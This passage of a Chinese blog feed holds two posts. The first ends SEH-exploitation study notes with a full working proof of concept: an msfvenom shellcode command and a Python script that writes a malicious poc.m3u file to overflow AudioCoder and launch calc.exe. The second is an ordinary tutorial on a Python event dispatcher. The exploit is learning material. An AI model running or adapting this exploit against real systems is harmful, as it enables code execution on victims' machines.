&lt;h2 id=&quot;完整的利用代码&quot;&gt;&lt;a href=&quot;#完整的利用代码&quot; class=&quot;headerlink&quot; title=&quot;完整的利用代码&quot;&gt;&lt;/a&gt;完整的利用代码&lt;/h2&gt;&lt;p&gt;通过 msfvenom 生成 shellcode，注意去除坏字符：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;./msfvenom -p windows/exec CMD=calc.exe -b &amp;quot;\x00\xff\x0a\x0d&amp;quot; -f python&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最终利用代码如下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;#!/usr/bin/env python3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf = b&amp;quot;http://&amp;quot; + b&amp;quot;\x90&amp;quot; * 757&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;nseh = b&amp;quot;\xeb\x06\x90\x90&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;seh = b&amp;quot;\x63\x2e\x01\x66&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellcode = (&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;b&amp;quot;\xb8\x7c\xf0\x94\x23\xda\xde\xd9\x74\x24\xf4\x5b\x2b&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;b&amp;quot;\xc9\xb1\x31\x83\xeb\xfc\x31\x43\x0f\x03\x43\x73\x12&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;b&amp;quot;\x61\xdf\x63\x50\x8a\x20\x73\x35\x02\xc5\x42\x75\x70&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;b&amp;quot;\x8d\xf4\x45\xf2\xc3\xf8\x2e\x56\xf0\x8b\x43\x7f\xf7&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;b&amp;quot;\x3c\xe9\x59\x36\xbd\x42\x99\x59\x3d\x99\xce\xb9\x7c&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;b&amp;quot;\x52\x03\xbb\xb9\x8f\xee\xe9\x12\xdb\x5d\x1e\x17\x91&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;b&amp;quot;\x5d\x95\x6b\x37\xe6\x4a\x3b\x36\xc7\xdc\x30\x61\xc7&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;b&amp;quot;\xdf\x95\x19\x4e\xf8\xfa\x24\x18\x73\xc8\xd3\x9b\x55&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;b&amp;quot;\x01\x1b\x37\x98\xae\xee\x49\xdc\x08\x11\x3c\x14\x6b&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;b&amp;quot;\xac\x47\xe3\x16\x6a\xcd\xf0\xb0\xf9\x75\xdd\x41\x2d&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;b&amp;quot;\xe3\x96\x4d\x9a\x67\xf0\x51\x1d\xab\x8a\x6d\x96\x4a&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;b&amp;quot;\x5d\xe4\xec\x68\x79\xad\xb7\x11\xd8\x0b\x19\x2d\x3a&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;b&amp;quot;\xf4\xc6\x8b\x30\x18\x12\xa6\x1a\x76\xe5\x34\x21\x34&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;b&amp;quot;\xe5\x46\x2a\x68\x8e\x77\xa1\xe7\xc9\x87\x60\x4c\x25&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;b&amp;quot;\xc2\x29\xe4\xae\x8b\xbb\xb5\xb2\x2b\x16\xf9\xca\xaf&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;b&amp;quot;\x93\x81\x28\xaf\xd1\x84\x75\x77\x09\xf4\xe6\x12\x2d&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;b&amp;quot;\xab\x07\x37\x4e\x2a\x94\xdb\xbf\xc9\x1c\x79\xc0&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload = buf + nseh + seh + b&amp;quot;\x90&amp;quot; * 20 + shellcode&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;m3u_file = open(&amp;quot;poc.m3u&amp;quot;, &amp;quot;wb&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;m3u_file.write(payload)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;m3u_file.close()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2015/08/09/seh-4.png&quot; alt=&quot;图 4&quot;&gt;&lt;br&gt;注：shellcode 运行后，AudioCoder 退出。&lt;/p&gt;
&lt;h2 id=&quot;其他异常处理利用思路&quot;&gt;&lt;a href=&quot;#其他异常处理利用思路&quot; class=&quot;headerlink&quot; title=&quot;其他异常处理利用思路&quot;&gt;&lt;/a&gt;其他异常处理利用思路&lt;/h2&gt;&lt;p&gt;还可以通过攻击 V.E.H、攻击 TEB、攻击 U.E.F 等方式利用异常处理，具体可以参考 David Litchfield 在 Black Hat 上的演讲，PPT 地址：&lt;a href=&quot;http://www.blackhat.com/presentations/win-usa-04/bh-win-04-litchfield/bh-win-04-litchfield.ppt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.blackhat.com/presentations/win-usa-04/bh-win-04-litchfield/bh-win-04-litchfield.ppt&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Reference&quot;&gt;&lt;a href=&quot;#Reference&quot; class=&quot;headerlink&quot; title=&quot;Reference&quot;&gt;&lt;/a&gt;Reference&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;《0day 安全 软件漏洞分析技术》&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://x0day.me/index.php/archives/seh-based-exploit.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;exploit with SEH - DM_’s blog&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;最近学习了《0day 安全 软件漏洞分析技术》中的堆溢出及 S.E.H 章节，记录笔记如下。&lt;/p&gt;
&lt;h2 id=&quot;基础概念&quot;&gt;&lt;a href=&quot;#基础概念&quot; class=&quot;headerlink&quot; title=&quot;基础概念&quot;&gt;&lt;/a&gt;基础概念&lt;/h2&gt;&lt;p&gt;S.E.H 即异常处理结构体（Structure Exception Handler），它是 Windows 异常处理机制所采用的重要数据结构。每个 S.E.H 包含两个 DWORD 指针：S.E.H 链表指针和异常处理函数句柄，共 8 个字节，如图：
    
    </summary>
    
      <category term="Exploit" scheme="http://sh3ll.me/categories/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>Python 实现事件监听</title>
    <link href="http://sh3ll.me/2015/03/22/python-event-handler/"/>
    <id>http://sh3ll.me/2015/03/22/python-event-handler/</id>
    <published>2015-03-22T13:32:20.000Z</published>
    <updated>2016-07-16T09:12:50.038Z</updated>
    
    <content type="html">&lt;h2 id=&quot;缘起&quot;&gt;&lt;a href=&quot;#缘起&quot; class=&quot;headerlink&quot; title=&quot;缘起&quot;&gt;&lt;/a&gt;缘起&lt;/h2&gt;&lt;p&gt;最近的项目需要用到事件监听机制，Google 了下，Python 似乎没有专门用于这方面的包。参考大牛发的 Snippet 写了个事件监听类，方便以后调用。&lt;/p&gt;
&lt;h2 id=&quot;事件类&quot;&gt;&lt;a href=&quot;#事件类&quot; class=&quot;headerlink&quot; title=&quot;事件类&quot;&gt;&lt;/a&gt;事件类&lt;/h2&gt;&lt;p&gt;首先需要有自己的事件类，定义如下两个 Demo：&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;class Event1:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Event 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    value = &amp;quot;this is a event, &amp;lt;Event 1&amp;gt;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;class Event2:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Event 2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    value = &amp;quot;this is a event, &amp;lt;Event 2&amp;gt;&amp;quot;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;事件管理、分发&quot;&gt;&lt;a href=&quot;#事件管理、分发&quot; class=&quot;headerlink&quot; title=&quot;事件管理、分发&quot;&gt;&lt;/a&gt;事件管理、分发&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;#!/usr/bin/env python3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# -*- coding:utf-8 -*-&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Event Manager，负责任务的分发&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;from queue import Queue, Empty&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;from multiprocessing.dummy import Pool&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;class EventManager:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    事件分发&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    def __init__(self):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        初始化&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        self.__event_handler = &amp;#123;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        self.__pool = Pool(5)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    def add_event_handler(self, event_type, handler):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        注册 event handler&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        :param event_type: 事件类型&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        :type event_type: object&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        :param handler: Event Handler&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        :type handler: function&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        self.__event_handler.setdefault(event_type, []).append(handler)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    def dispatch_event(self, event):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        分发事件&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        :param event: 事件&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        :type event: Event&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        :return: 是否分发成功&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        :rtype: bool&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        try:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            handlers = self.__event_handler.get(event.__class__, [])&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            for handler in handlers:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                self.__pool.apply_async(&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    func=handler,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    args=(event,),&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    callback=self.__handler_callback&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            return True&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        except:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            return False&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    def __handler_callback(self, result):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        进程回调&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        :param result: 返回值&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        :type result: str&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        print(result)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由上而下，类中共有 4 个方法。&lt;/p&gt;
&lt;h3 id=&quot;init&quot;&gt;&lt;a href=&quot;#init&quot; class=&quot;headerlink&quot; title=&quot;__init__&quot;&gt;&lt;/a&gt;__init__&lt;/h3&gt;&lt;p&gt;&lt;code&gt;self.__event_handler&lt;/code&gt;：    用于注册 handler&lt;br&gt;&lt;code&gt;self.__pool&lt;/code&gt;：              以线程池的形式进行任务调度&lt;/p&gt;
&lt;h3 id=&quot;add-event-handler&quot;&gt;&lt;a href=&quot;#add-event-handler&quot; class=&quot;headerlink&quot; title=&quot;add_event_handler&quot;&gt;&lt;/a&gt;add_event_handler&lt;/h3&gt;&lt;p&gt;注册 event-handler，将 handler 保存至 &lt;code&gt;self.__event_handler&lt;/code&gt; 中，以供后期分发事件。&lt;/p&gt;
&lt;h3 id=&quot;dispatch-event&quot;&gt;&lt;a href=&quot;#dispatch-event&quot; class=&quot;headerlink&quot; title=&quot;dispatch_event&quot;&gt;&lt;/a&gt;dispatch_event&lt;/h3&gt;&lt;p&gt;分发事件，做法是根据事件类型（&lt;code&gt;event.__class__&lt;/code&gt;）从 &lt;code&gt;self.__event_handler&lt;/code&gt; 中获取其 &lt;code&gt;handler&lt;/code&gt;，依次将 &lt;code&gt;handler(event)&lt;/code&gt; 添加至线程池中，&lt;code&gt;callback&lt;/code&gt; 用于处理 &lt;code&gt;handler&lt;/code&gt; 的返回结果，如不需要可以自行去掉。&lt;/p&gt;
&lt;h3 id=&quot;handler-callback&quot;&gt;&lt;a href=&quot;#handler-callback&quot; class=&quot;headerlink&quot; title=&quot;__handler_callback&quot;&gt;&lt;/a&gt;__handler_callback&lt;/h3&gt;&lt;p&gt;用于处理 &lt;code&gt;handler&lt;/code&gt; 的返回结果，如不需要可以自行去掉。&lt;/p&gt;
&lt;h2 id=&quot;测试&quot;&gt;&lt;a href=&quot;#测试&quot; class=&quot;headerlink&quot; title=&quot;测试&quot;&gt;&lt;/a&gt;测试&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;def handler1(event):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    处理 Event1 的 handler&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    return &amp;quot;I&amp;apos;m handler1, monitored an event. Its value: &amp;#123;value&amp;#125;&amp;quot;.format(value=event.value)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;def handler2(event):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    处理 Event2 的 handler&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    return &amp;quot;I&amp;apos;m handler2, monitored an event. Its value: &amp;#123;value&amp;#125;&amp;quot;.format(value=event.value)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# 实例化 EventManager&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;em = EventManager()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# 注册 handler&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;em.add_event_handler(Event1, handler1)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;em.add_event_handler(Event2, handler2)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# 分发事件&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;e1 = Event1()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;e2 = Event2()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;em.dispatch_event(e1)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;em.dispatch_event(e2)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;/images/2015/03/22/python-event-handler.png&quot; alt=&quot;测试&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;References&quot;&gt;&lt;a href=&quot;#References&quot; class=&quot;headerlink&quot; title=&quot;References&quot;&gt;&lt;/a&gt;References&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://en.sharejs.com/python/11925&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Simple event dispatcher (Python recipe)&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;缘起&quot;&gt;&lt;a href=&quot;#缘起&quot; class=&quot;headerlink&quot; title=&quot;缘起&quot;&gt;&lt;/a&gt;缘起&lt;/h2&gt;&lt;p&gt;最近的项目需要用到事件监听机制，Google 了下，Python 似乎没有专门用于这方面的包。参考大牛发的 Snippet 写了个事件监听类，方便以后调用。&lt;/p&gt;
&lt;h2 id=&quot;事件类&quot;&gt;&lt;a href=&quot;#事件类&quot; class=&quot;headerlink&quot; title=&quot;事件类&quot;&gt;&lt;/a&gt;事件类&lt;/h2&gt;&lt;p&gt;首先需要有自己的事件类，定义如下两个 Demo：
    
    </summary>
    
      <category term="Program" scheme="http://sh3ll.me/categories/Program/"/>
    
    
